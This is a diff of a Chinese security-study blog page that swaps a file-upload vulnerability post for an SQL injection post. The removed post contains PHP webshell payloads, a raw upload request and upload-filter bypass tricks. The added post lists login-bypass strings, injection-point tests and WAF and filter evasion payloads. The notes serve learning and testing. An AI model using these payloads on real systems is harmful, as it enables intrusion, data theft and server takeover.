@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">web学习笔记——文件上传 | NanIvy</title>
+  <title itemprop="name">web学习笔记——SQL注入 | NanIvy</title>
   
     <link rel="shortcut icon" href="/qq_pic_merged_1602861906220.jpg">
   
@@ -311,11 +311,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/illust_72360695_20181230_000724.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/illust_72360695_20181230_000724.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/2K-苹果糖夏日祭.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/2K-苹果糖夏日祭.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      web学习笔记——文件上传</h1>
+      web学习笔记——SQL注入</h1>
       <p class="entry-census">
         <span>
           <a href="NanIvy.space">
@@ -327,7 +327,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-1-29<span class="bull">
+        2021-3-3<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -341,55 +341,139 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><p>常见工具：BurpSuite、蚁剑。</p>
-<h2 id="原理及利用"><a href="#原理及利用" class="headerlink" title="原理及利用"></a>原理及利用</h2><p>为什么会有文件上传漏洞，字面意思文件上传的漏洞。在一些上传文件的入口，面对上传文件，若不对上传文件进行严格的验证和过滤就容易造成这漏洞的产生。即可能上传任何文件——包括病毒、脚本。</p>
-<p>上传正常的php对服务器没有什么危害，但总有离谱的——如：PHP是编程语言，可以查看目录下的文件，查看文件中的代码，还能执行系统命令。上传恶意的PHP文件，甚至还能控制整个网站文件甚至是服务器。</p>
-<p>或者有上传钓鱼图片的，flash的策略文件.xml的。</p>
-<p>不过一般情况下的利用，指的应该就是“上传web脚本”并让服务器解析吧。即webshell攻击。成功的条件也是有的：能上传，能调用，能被执行，不被安全检查（想办法绕过）或格式化或者图片马被压缩（可能会导致内容改变而影响功能）。</p>
-<h2 id="常见绕过总结"><a href="#常见绕过总结" class="headerlink" title="常见绕过总结"></a>常见绕过总结</h2><h3 id="常见校验上传文件的方法及对应绕过思路"><a href="#常见校验上传文件的方法及对应绕过思路" class="headerlink" title="常见校验上传文件的方法及对应绕过思路"></a>常见校验上传文件的方法及对应绕过思路</h3><h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><p>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式<br>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。<br>客户端校验绕过：<br>直接修改js代码（一些浏览器自带选项貌似有禁用js选项）或者使用抓包的方法修改请求内容绕过，可以先上传一个gif木马，通过抓包修改为 jsp/php/asp，只用这种方法来检测是肯定可以绕过的。</p>
-<h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><p>校验请求头 content-type字段，例如用PHP检测</p>
-<p> if($_FILES[‘userfile’][‘type’] != “image/gif”){<br> ….<br>}<br>通过自己写正则匹配来判断文件幻数(文件头)内容是否符合要求，一般来说属于白名单的检测，常见的文件头（文件头标志位）如下：<br>括号中对应的二进制代码<br>（1）.JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）<br>（2）.gif，”GIF89A”（474946383961）<br>（3）.zip，”ZipCompressed”（504B0304）<br>（4）.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1）<br>还有其他的文件头可自行资料查找。</p>
-<p>服务端绕过<br>校验请求头content-type字段绕过</p>
-<p>通过抓包来修改Http头的content-type即可绕过，也肯定是可以绕过这种检测</p>
-<p> POST /upload.php HTTP/1.1<br>TE: deflate,gzip;q=0.3<br>Connection: TE, close<br>Host: localhost<br>User-Agent: libwww-perl/5.803<br>Content-Type: multipart/form-data; boundary=xYzZY<br>Content-Length: 155<br>–666666666666666666666666-<br>Content-Disposition: form-data; name=”userfile”; filename=”shell.php”<br>Content-Type: image/gif (原为 Content-Type: text/plain)<br>&lt;?php system($_GET[‘command’]);?&gt;<br>–6666666666666666666666666-</p>
-<p>文件幻数(文件头)检测绕过：</p>
-<p>在木马内容的前面插入对应的文件头内容，例如：GIF89a ，更靠谱的方法是在可上传的文件中插入木马代码，然后修改后缀</p>
-<h4 id="文件加载检测："><a href="#文件加载检测：" class="headerlink" title="文件加载检测："></a>文件加载检测：</h4><p>一般是调用API或函数去进行文件加载测试，例如图像渲染测试，当测试结果正常的时候才允许上传</p>
-<p>1、一次渲染（代码注入）<br>2、二次渲染</p>
-<p> 文件加载检绕过<br>通过例如加载文件进行图像渲染的方式来测试，这个时候就一般需要在正常的文件中插入木马代码了，例如图像，那么插入的代码一般会放在图像的注释区，因此不会影响图像正常渲染绕过这种检测，此时可以使用工具（称为插马器）来进行插入，例如edjpgcom，或者直接用copy命令来合成也可以。当然这种检测不一定能够完全绕过</p>
-<h4 id="后缀名黑名单校验、后缀名白名单校验："><a href="#后缀名黑名单校验、后缀名白名单校验：" class="headerlink" title="后缀名黑名单校验、后缀名白名单校验："></a>后缀名黑名单校验、后缀名白名单校验：</h4><p>后缀名检测</p>
-<p>后缀黑名单检测绕过：找查blacklist(黑名单列表)的漏网之鱼，例如<br>大小写：如果检测的时候不忽略大小写，那么可以改变后缀名的大小写绕过<br>扩展名：黑名单中如果忽略了某些能被解析的文件扩展名：<br>     jsp jspx jspf<br>    asp asa cer aspx<br>    php php php3 php4 pht php5<br>    exe exee</p>
-<p>后缀白名单检测绕过：白名单检测还是会比黑名单强一点，常见的绕过方法有%00截断，还有服务器的解析漏洞<br>%00截断漏洞：如果存在这类漏洞，那么后缀名的检测都可以绕过，此时我们可以如下命名一个上传文件</p>
-<p>test.php%00.jpg</p>
-<h4 id="操作系统相关绕过："><a href="#操作系统相关绕过：" class="headerlink" title="操作系统相关绕过："></a>操作系统相关绕过：</h4><p>上传不符合windows文件命名规则的文件名</p>
-<p> test.asp.（windows的结尾默认不为为.会自动消掉这个点）<br>test.asp(空格)<br>test.php:1.jpg<br>test.php::$DATA<br>shell.php::$DATA…….<br>会被某些版本的windows系统自动去掉不符合规则符号后面的内容。</p>
-<p>linux下后缀名大小写：<br>linux是大小写敏感的，因此一般检测也会区分大小写，但某些解析器是不区分大小写的，例如PHP，上传php不被解析，可以试试上传pHp后缀的文件名。</p>
-<h4 id="竞争条件攻击："><a href="#竞争条件攻击：" class="headerlink" title="竞争条件攻击："></a>竞争条件攻击：</h4><p>一些网站上传文件逻辑上是允许上传任意文件的，然后检查上传文件的内容是否包含webshell脚本，如果包含则删除该文件，这里存在的问题是文件上传成功之后和删除文件之间存在一个短的时间差，攻击者就可以利用这个时间差来上传漏洞攻击。攻击者先上传一个webshell脚本1.php内容如下：</p>
-<p>&lt;?php fputs(fopen(‘../shell.php’,’w’),’&lt;?php @eval($_POST[a]) ?&gt;’); ?&gt;<br>代码内容就是生成一个新的webshell，shell.php，那么当1.php上传成功之后，我们快速访问这个文件，这时就会在服务器端当前目录下自动生成shell.php，这时就利用时间差完成了webshell的上传。</p>
-<h4 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h4><p>CMS漏洞： 可以针对不同CMS存在的上传漏洞进行绕过。<br>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>参考链接：<br><a href="https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html</a><br><a href="https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1" target="_blank" rel="noopener">https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1</a></p>
-<h4 id="WAF校验："><a href="#WAF校验：" class="headerlink" title="WAF校验："></a>WAF校验：</h4><p>即使用不同的WAF产品来进行过滤，通常是独立与服务程序的一段中间程序或者硬件<br> WAF绕过：<br>参考链接：<a href="https://www.freebuf.com/articles/web/160175.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/160175.html</a></p>
-<h3 id="解析漏洞："><a href="#解析漏洞：" class="headerlink" title="解析漏洞："></a>解析漏洞：</h3><p>这类漏洞是本身服务器的中间件产生的，例如apache，nginx都被爆出过存在解析漏洞，存在解析漏洞的话，上传的安全性几乎就完全失去了，下面再详细分析。</p>
-<p>服务器解析漏洞</p>
-<h4 id="IS5-x-6-x解析漏洞"><a href="#IS5-x-6-x解析漏洞" class="headerlink" title="IS5.x-6.x解析漏洞"></a>IS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
-<p>目录解析(6.0)<br>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a> 原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。</p>
-<p>文件解析<br>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a> 原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型</p>
-<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
-<h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4><p>漏洞原理</p>
-<p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
-<p>漏洞形式</p>
-<p><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">www.xxxx.xxx.com/test.php.php123</a><br>其余配置问题导致漏洞</p>
-<p>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</p>
-<p>如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
-<h4 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h4><p>漏洞原理</p>
-<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT_FILENAME。当访问 <a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，</a> $fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
-<p>PHP会认为SCRIPTFILENAME是phpinfo.jpg，而1.php是PATHINFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
-<p>漏洞形式</p>
-<p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg</a> %00.php<br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/</a> %20.php</p>
-<p>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
-<p>IIS7.5解析漏洞</p>
-<p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
-<p>参考文章</p>
-<p><a href="https://www.secpulse.com/archives/95987.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/95987.html</a><br><a href="https://blog.csdn.net/weixin_44119101/article/details/107669831" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44119101/article/details/107669831</a></p>
+          <h3 id="SQL产生原理"><a href="#SQL产生原理" class="headerlink" title="SQL产生原理"></a>SQL产生原理</h3><p>​        所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。当应用程序使用输入内容来构造动态sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。 黑客通过SQL注入攻击可以拿到网站数据库的访问权限，之后他们就可以拿到网站数据库中所有的数据，恶意的黑客可以通过SQL注入功能篡改数据库中的数据甚至会把数据库中的数据毁坏掉</p>
+<p>​        通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<p>​        根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
+<h3 id="SQL注入方法理解"><a href="#SQL注入方法理解" class="headerlink" title="SQL注入方法理解"></a>SQL注入方法理解</h3><p><strong>1.数字注入</strong></p>
+<p>  在浏览器地址栏输入：learn.me/sql/article.php?id=1，这是一个<strong>get型接口</strong>，发送这个请求相当于调用一个查询语句：</p>
+<pre><code class="sql">$sql = &quot;SELECT * FROM article WHERE id =&quot;,$id
+</code></pre>
+<p>  正常情况下，应该返回一个id=1的文章信息。那么，如果在浏览器地址栏输入：<strong>learn.me/sql/article.php?id=-1 OR 1 =1</strong>，这就是一个SQL注入攻击了，可能会返回所有文章的相关信息。为什么会这样呢？</p>
+<p>  这是因为，id = -1永远是false，1=1永远是true，所有整个where语句永远是ture，所以where条件相当于没有加where条件，那么查询的结果相当于整张表的内容。（危）</p>
+<p><strong>2.字符串注入</strong></p>
+<p>  有这样一个用户登录场景：登录界面包括用户名和密码输入框，以及提交按钮。输入用户名和密码，提交。</p>
+<p>  这是一个post请求，登录时调用接口learn.me/sql/login.html，首先连接数据库，然后后台对post请求参数中携带的用户名、密码进行参数校验，即sql的查询过程。假设正确的用户名和密码为user和pwd123，输入正确的用户名和密码、提交，相当于调用了以下的SQL语句：</p>
+<pre><code class="sql">SELECT * FROM user WHERE username = &#39;user&#39; ADN password = &#39;pwd123&#39;
+</code></pre>
+<p>​      由于用户名和密码都是字符串，SQL注入方法即把参数携带的数据变成mysql中注释的字符串。mysql中有2种注释的方法：</p>
+<p>（1）’#’：’#’后所有的字符串都会被当成注释来处理</p>
+<p> 用户名输入：<strong>user’#</strong>（单引号闭合user左边的单引号），密码随意输入，如：111，然后点击提交按钮。等价于SQL语句：</p>
+<pre><code class="sql">SELECT * FROM user WHERE username = &#39;user&#39;#&#39;ADN password = &#39;111&#39;
+</code></pre>
+<p>  ‘#’后面都被注释掉了，相当于：</p>
+<pre><code class="sql">SELECT * FROM user WHERE username = &#39;user&#39; 
+</code></pre>
+<p>（2）’– ‘ （–后面有个空格）：’– ‘后面的字符串都会被当成注释来处理</p>
+<p>  用户名输入：<strong>user’–</strong> （注意–后面有个空格，单引号闭合user左边的单引号），密码随意输入，如：111，然后点击提交按钮。等价于SQL语句：</p>
+<pre><code class="sql">SELECT * FROM user WHERE username = &#39;user&#39;-- &#39;AND password = &#39;111&#39;
+</code></pre>
+<p>  SELECT * FROM user WHERE username = ‘user’– ‘AND password = ‘1111’</p>
+<p> ‘– ‘后面都被注释掉了，相当于：</p>
+<pre><code class="sql">SELECT * FROM user WHERE username = &#39;user&#39;
+</code></pre>
+<p>  因此，以上两种情况可能输入一个错误的密码或者不输入密码就可登录用户名为’user’的账号，这是十分危险的事情。</p>
+<h3 id="SQL注入点判断"><a href="#SQL注入点判断" class="headerlink" title="SQL注入点判断"></a>SQL注入点判断</h3><p>分类</p>
+<p>1、常见的sql注入按照参数类型可分为两种：数字型和字符型。</p>
+<p>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p>
+<p>2、也可以根据数据库返回的结果，分为回显注入、报错注入、盲注。</p>
+<p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p>
+<p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
+<p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p>
+<p>3、按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。</p>
+<p>判断</p>
+<p><strong>GET注入</strong></p>
+<p><strong>1、数字型</strong>：</p>
+<p>猜测SQL语句：</p>
+<p>select 字段名 from 表名 where id = 1；</p>
+<pre><code>http://www.sql.com/xxx.php?id=1              假设ID为存在注入的参数
+http://www.sql.com/xxx.php?id=1‘             语句报错
+http://www.sql.com/xxx.php?id=1 and 1=1      页面正常返回结果
+http://www.sql.com/xxx.php?id=1 and 1=2      页面返回错误
+1234
+</code></pre><p>如果以上几个测试步骤结果全部满足，就可能存在sql注入漏洞。</p>
+<p>数字型注入一般出现在asp，php等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=1，PHP会自动把ID的数据类型推导为int类型，若是 id=1 and 1=1，则把ID推导为string类型。但是对于Java、c#这类强类型语言，如果把一个字符串转换为int类型，则会抛出异常，无法运行，所以数字型注入一般出现在弱类型的语言当中，强类型语言很少存在。</p>
+<p><strong>2、字符型</strong>：</p>
+<p>猜测SQL语句：</p>
+<p>select 字段名 from 表名 where id =‘；</p>
+<pre><code>http://www.sql.com/xxx.php?id=1                      假设ID为存在注入的参数
+http://www.sql.com/xxx.php?id=1‘                     语句报错
+http://www.sql.com/xxx.php?id=1&#39; and 1=1 and &#39;1&#39;=&#39;1  页面正常返回结果
+http://www.sql.com/xxx.php?id=1&#39; and 1=2 and &#39;1&#39;=&#39;1  页面返回错误
+1234
+</code></pre><p><strong>3、搜索型</strong>：</p>
+<p>猜测SQL语句：</p>
+<p>select 字段 from 表名 where username like ‘%k%’;</p>
+<pre><code>http://www.sql.com/xxx.php?search=test                  假设search为存在注入的参数
+http://www.sql.com/xxx.php?search=test&#39;                 语句报错
+http://www.sql.com/xxx.php?search=test%&#39; and 1=1 and &#39;%&#39;=&#39;   页面正常返回结果
+http://www.sql.com/xxx.php?search=test%&#39; and 1=2 and &#39;%&#39;=&#39;   页面返回错误
+</code></pre><h3 id="常见SQL注入过滤的绕过"><a href="#常见SQL注入过滤的绕过" class="headerlink" title="常见SQL注入过滤的绕过"></a>常见SQL注入过滤的绕过</h3><h4 id="1-1-and-or的过滤-拦截"><a href="#1-1-and-or的过滤-拦截" class="headerlink" title="1-1.and/or的过滤/拦截"></a>1-1.and/or的过滤/拦截</h4><p>双写<br>使用运算符(||、&amp;&amp;)<br>直接使用拼接=号<br>使用异或注入</p>
+<h4 id="1-2-空格被过滤-拦截"><a href="#1-2-空格被过滤-拦截" class="headerlink" title="1-2.空格被过滤/拦截"></a>1-2.空格被过滤/拦截</h4><p>多层括号嵌套<br>改用+号<br>使用注释/**/<br>and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略<br>%09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格（因为Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p>
+<h4 id="1-3-括号被过滤-拦截"><a href="#1-3-括号被过滤-拦截" class="headerlink" title="1-3.括号被过滤/拦截"></a>1-3.括号被过滤/拦截</h4><p>order by 大小比较盲注（见下面的讲解）</p>
+<h4 id="1-4-逗号被过滤-拦截"><a href="#1-4-逗号被过滤-拦截" class="headerlink" title="1-4.逗号被过滤/拦截"></a>1-4.逗号被过滤/拦截</h4><p>改用盲注</p>
+<p>使用join语句代替，如union select 1,2,3 可改为 union select</p>
+<p>join(select 1) join(select 2) join(select 3)</p>
+<p>substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</p>
+<h4 id="1-5-information-schema被过滤-拦截"><a href="#1-5-information-schema被过滤-拦截" class="headerlink" title="1-5.information_schema被过滤/拦截"></a>1-5.information_schema被过滤/拦截</h4><p>利用innodb存储引擎(需要Mysql版本在5.5.x后并且Mysql开启了innoDB引擎)，例如下：</p>
+<pre><code class="sql">select table_name from mysql.innodb_table_stats where database_name=database();
+select table_name from mysql.innodb_index_stats where database_name=database();
+</code></pre>
+<p>接下来的四个只能用于查表名，无法查询列名，所以进一步获取数据还需无列名注入<br>sys.schema_auto_increment_columns<br>sys.x$schema_table_statistics_with_buffer<br>sys.schema_table_statistics_with_buffer<br>sys.x$ps_schema_table_statistics_io</p>
+<p>那么接下来就补充一下无列名注入吧</p>
+<h5 id="利用join进行无列名注入（使用别名）"><a href="#利用join进行无列名注入（使用别名）" class="headerlink" title="利用join进行无列名注入（使用别名）"></a>利用join进行无列名注入（使用别名）</h5><p>join … using(xx)</p>
+<p>当知道表名为users时，使用如下语句得到列名<br>第一列：?id=-1’union all select<em>from (select </em> from users as a join users b)c#</p>
+<p>第二列：?id=-1’ union all select<em>from (select </em> from users as a join users b using(id))c–+</p>
+<p>第三列：?id=-1’ union all select<em>from (select </em> from users as a join users b using(id,username))c–+</p>
+<p>后面的列名可以此类推</p>
+<h4 id="1-6-单双引号被被过滤-拦截-转义"><a href="#1-6-单双引号被被过滤-拦截-转义" class="headerlink" title="1-6.单双引号被被过滤/拦截/转义"></a>1-6.单双引号被被过滤/拦截/转义</h4><ul>
+<li><p>可根据sql语句，使用转移符号逃逸出一个单/双引号，例题可参考[BJDCTF 2nd]简单注入</p>
+</li>
+<li><p>需要逃逸单引号的情况：尝试是否存在编码问题而产生的SQL注入。<br>不需要逃逸单引号的情况：字符串可用十六进制(hex函数)表示、也可通过进制转换函数表示成其他进制或者使用其他编码，如char()<br>SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p>
+</li>
+<li><p>还可以使用%2527<br>主要绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是’，所以成功绕过过滤。</p>
+</li>
+</ul>
+<h4 id="1-7-数字和单个字母被过滤-拦截"><a href="#1-7-数字和单个字母被过滤-拦截" class="headerlink" title="1-7.数字和单个字母被过滤/拦截"></a>1-7.数字和单个字母被过滤/拦截</h4><pre><code>false或!pi()：0
+true或!!pi()：1
+true+true：2
+floor(pi())：3
+ceil(pi())：4
+floor(version())：5
+ceil(version())：6
+ceil(pi()+pi())：7
+floor(version()+pi())：8
+floor(pi()*pi())：9
+ceil(pi()*pi())：10
+ceil(pi()*pi())+true：11
+ceil(pi()+pi()+version())：12
+floor(pi()*pi()+pi())：13
+ceil(pi()*pi()+pi())：14
+ceil(pi()*pi()+version())：15
+floor(pi()*version())：16
+ceil(pi()*version())：17
+ceil(pi()*version())+true：18
+floor((pi()+pi())*pi())：19
+ceil((pi()+pi())*pi())：20
+ceil(ceil(pi())*version())：21
+ceil(pi()*ceil(pi()+pi()))：22
+ceil((pi()+ceil(pi()))*pi())：23
+ceil(pi())*ceil(version())：24
+floor(pi()*(version()+pi()))：25
+floor(version()*version())：26
+ceil(version()*version())：27
+ceil(pi()*pi()*pi()-pi())：28
+floor(pi()*pi()*floor(pi()))：29
+</code></pre><p>使用conv([0-9],10,36)可以表示0~9的数字，conv([10~35],10,36)可以表示a~z单个字母，conv([35+],10,36)可自行按照三十六进制转换</p>
+<h4 id="1-8-其他系统关键字被过滤-拦截"><a href="#1-8-其他系统关键字被过滤-拦截" class="headerlink" title="1-8.其他系统关键字被过滤/拦截"></a>1-8.其他系统关键字被过滤/拦截</h4><p>双写绕过关键字过滤<br>使用同义函数/语句代替，如if函数可用如下语句代替。</p>
+<pre><code class="sql">case when condition then 1 else 0 end
+</code></pre>
+<h4 id="1-9-等号被过滤"><a href="#1-9-等号被过滤" class="headerlink" title="1-9.等号被过滤"></a>1-9.等号被过滤</h4><p>使用in或like关键字绕过</p>
+<h4 id="1-10-过滤sleep"><a href="#1-10-过滤sleep" class="headerlink" title="1-10.过滤sleep()"></a>1-10.过滤sleep()</h4><ul>
+<li>BENCHMARK(count,expr)<br>BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。</li>
+<li>笛卡尔积<br>select if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0);</li>
+<li>GET_LOCK<br>在一个session中可以先锁定一个变量例如：select get_lock(‘smi1e’,1)<br>然后通过另一个session 再次执行get_lock函数 select get_lock(‘smi1e’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。<br>但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</li>
+<li>RLIKE/REGEXP<br>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。<br>select rpad(‘a’,4999999,’a’) RLIKE concat(repeat(‘(a.*)+’,30),’b’)</li>
+</ul>
 
         </div>
         <!-- .entry-content -->
@@ -421,7 +505,7 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2021/02/09/web学习笔记——http请求响应/" rel="prev">
+            <a href="/2021/03/04/web学习笔记——http请求响应/" rel="prev">
               <div class="background">
                 <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/1604718424577.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/1604718424577.jpg">
               </div>
@@ -439,15 +523,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2021/01/03/web学习笔记——SQL注入/" rel="next">
+            <a href="/2021/03/03/wp/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/2K-苹果糖夏日祭.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/2K-苹果糖夏日祭.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/80264773_0.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0NanIvy0/cdn@1.2/80264773_0.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                web学习笔记——SQL注入</h3>
+                Hgame2021及xctf新手区总结及wp</h3>
                 <hr>
               </div>
             </a>
